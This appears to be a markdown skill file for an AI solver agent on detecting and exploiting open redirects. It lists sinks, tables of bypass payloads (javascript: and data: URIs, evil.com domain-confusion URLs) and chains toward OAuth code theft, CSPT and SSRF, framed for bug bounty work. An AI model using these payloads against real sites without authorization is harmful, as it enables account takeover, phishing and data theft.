---
name: open-redirect
description: "Open redirect detection and exploitation. Load when a solver encounters location assignments, window.open, or URL-based navigation with user-controlled values. Especially relevant for OAuth flows and CSPT chains."
---

# Open Redirect Exploitation Skill

## Sinks
- `location.href = userInput`, `location.assign(userInput)`, `location.replace(userInput)`
- `window.open(userInput)`, `<a>.href = userInput`, `<form>.action = userInput`
- `<meta http-equiv="refresh" content="0;url=userInput">`
- Framework routers: `navigate(userInput)`, `router.push(userInput)`, `$location.url(userInput)`

## Validation bypasses

### Protocol-based
| Payload | Bypass for |
|---------|-----------|
| `javascript:alert(1)` | No protocol check |
| `JAVASCRIPT:alert(1)` | Case-sensitive check |
| `\njavascript:alert(1)` | Newline before protocol |
| `java\tscript:alert(1)` | Tab inside protocol |
| `data:text/html,<script>alert(1)</script>` | No data: check |
| `//evil.com` | Protocol-relative (inherits https:) |

### Domain validation bypasses
| Payload | Bypass for |
|---------|-----------|
| `https://evil.com@target.com` | Userinfo confusion |
| `https://target.com.evil.com` | Subdomain trick |
| `https://evil.com#.target.com` | Fragment trick |
| `https://evil.com?.target.com` | Query string trick |
| `https://evil.com\@target.com` | Backslash normalization |
| `https://evil.com%40target.com` | Encoded @ |
| `https://evil.com/target.com` | Path confusion |

### PortSwigger Top 10 2025: URL parsing confusion
"Google Cloud Account Takeover via URL Parsing Confusion" (Mohamed Benchikh) — IPv6-specific multi-`@` userinfo parsing discrepancy between OAuth redirect validator and browser → bypass loopback-only allowlists → exfiltrate auth codes.

### Allowlist bypasses
| Check | Bypass |
|-------|--------|
| `url.startsWith('/')` | `//evil.com` (protocol-relative) |
| `url.includes('target.com')` | `https://evil.com/target.com` |
| `new URL(url).hostname === 'target.com'` | Parser quirks with special chars |

## Chain value — standalone vs chained

### Standalone: Low severity
Open redirect alone is typically **Low** in bug bounty. Many programs mark N/A or informative.

### Chained: High severity
| Chain | Impact |
|-------|--------|
| Open redirect in OAuth callback → steal authorization code | **Critical** — account takeover |
| Open redirect + CSPT → control fetch response | **High** — arbitrary API response |
| Open redirect from trusted domain → phishing | **Medium** — credential theft |
| Open redirect + CSP bypass → exfil data | **High** — data theft |
| Open redirect + SSRF → access internal services | **High** — network pivot |

### CSPT chain (Doyensec research)
Open redirect as a CSPT gadget: if a CSPT reroutes a fetch to an open redirect endpoint, the redirect can send the request to attacker's server, which responds with arbitrary content. The frontend processes attacker's response as if it came from the legitimate API.

## Bug bounty severity classification
- OAuth redirect manipulation → **Critical** (account takeover)
- Redirect in payment/financial flow → **High**
- Redirect with phishing potential → **Medium** (if from trusted domain)
- Redirect to same-origin or non-sensitive target → **Informative**
- Self-redirect (only affects clicking user) → **Informative**
- Redirect requiring POST body → **Low** (hard to exploit)

## Key references
- PortSwigger Top 10 2025: URL parsing confusion for OAuth takeover
- Doyensec CSPT + open redirect chain: https://blog.doyensec.com/2024/07/02/cspt2csrf.html
